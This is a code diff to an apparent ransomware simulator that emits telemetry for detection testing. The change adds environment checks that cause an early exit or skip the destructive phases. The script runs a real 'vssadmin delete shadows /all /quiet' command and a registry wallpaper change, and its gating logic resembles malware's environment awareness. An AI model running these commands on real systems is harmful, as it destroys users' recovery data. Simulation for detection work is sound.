@@ -24,7 +24,7 @@ import time
 from datetime import datetime, timezone
 from pathlib import Path
 
-from telemetry_helper import emit, set_phase, jitter
+from telemetry_helper import check_environment, emit, EnvSafety, set_phase, jitter
 
 
 # =============================================================================
@@ -103,6 +103,18 @@ def main() -> int:
     emit("PROCESS", "CREATE_PROCESS", sys.executable, "WARNING",
          source_process="ransomware.exe", metadata_info="Ransomware simulator started", pid=os.getpid())
 
+    env, env_reasons = check_environment()
+    if env_reasons:
+        emit("PROCESS", "ENVIRONMENT_CHECK",
+             os.environ.get("COMPUTERNAME", "unknown"),
+             "WARNING" if env != EnvSafety.CLEAN else "INFO",
+             source_process="ransomware.exe",
+             verdict=env.name, reasons=env_reasons)
+    if env == EnvSafety.COMPROMISED:
+        emit("PROCESS", "EXIT_PROCESS", "ransomware.exe", "INFO",
+             source_process="ransomware.exe", early_exit="COMPROMISED environment")
+        return 0
+
     user = os.environ.get("USERPROFILE", r"C:\Users\guestuser")
     docs = Path(user) / "Documents"
     desktop = Path(user) / "Desktop"
@@ -150,18 +162,19 @@ def main() -> int:
         jitter(0.08, 0.12)
 
     # --- Phase 3: Shadow copy deletion ---
-    set_phase("anti_recovery")
-    emit("PROCESS", "CREATE_PROCESS", "vssadmin.exe", "CRITICAL",
-         source_process="ransomware.exe", command="vssadmin delete shadows /all /quiet",
-         technique_id="T1490")
-    try:
-        import subprocess
-        subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"],
-                      capture_output=True, timeout=10)
-    except Exception:
-        pass
-    emit("REGISTRY", "DELETE_SHADOWS", r"HKLM\SYSTEM\CurrentControlSet\Services\VSS", "CRITICAL",
-         source_process="ransomware.exe", detail="Volume Shadow Copy deletion attempted")
+    if env != EnvSafety.SUSPICIOUS:
+        set_phase("anti_recovery")
+        emit("PROCESS", "CREATE_PROCESS", "vssadmin.exe", "CRITICAL",
+             source_process="ransomware.exe", command="vssadmin delete shadows /all /quiet",
+             technique_id="T1490")
+        try:
+            import subprocess
+            subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"],
+                          capture_output=True, timeout=10)
+        except Exception:
+            pass
+        emit("REGISTRY", "DELETE_SHADOWS", r"HKLM\SYSTEM\CurrentControlSet\Services\VSS", "CRITICAL",
+             source_process="ransomware.exe", detail="Volume Shadow Copy deletion attempted")
 
     # --- Phase 4: Ransom note ---
     set_phase("ransom_demand")
@@ -180,16 +193,17 @@ Key: NyxTrace-Simulation-Key-2024</p></body></html>""", encoding="utf-8")
          source_process="ransomware.exe", detail="Ransom note dropped", type="html")
 
     # --- Phase 5: Wallpaper change ---
-    set_phase("defacement")
-    emit("REGISTRY", "WALLPAPER", r"HKCU\Control Panel\Desktop", "WARNING",
-         source_process="ransomware.exe", value_name="Wallpaper", value_data=str(note_path),
-         detail="Desktop wallpaper changed to ransom note", technique_id="T1491.001")
-    try:
-        import subprocess
-        subprocess.run(["reg", "add", r"HKCU\Control Panel\Desktop",
-            "/v", "Wallpaper", "/t", "REG_SZ", "/d", "", "/f"], capture_output=True, timeout=5)
-    except Exception:
-        pass
+    if env != EnvSafety.SUSPICIOUS:
+        set_phase("defacement")
+        emit("REGISTRY", "WALLPAPER", r"HKCU\Control Panel\Desktop", "WARNING",
+             source_process="ransomware.exe", value_name="Wallpaper", value_data=str(note_path),
+             detail="Desktop wallpaper changed to ransom note", technique_id="T1491.001")
+        try:
+            import subprocess
+            subprocess.run(["reg", "add", r"HKCU\Control Panel\Desktop",
+                "/v", "Wallpaper", "/t", "REG_SZ", "/d", "", "/f"], capture_output=True, timeout=5)
+        except Exception:
+            pass
 
     # --- Phase 6: Persistence ---
     set_phase("persistence")
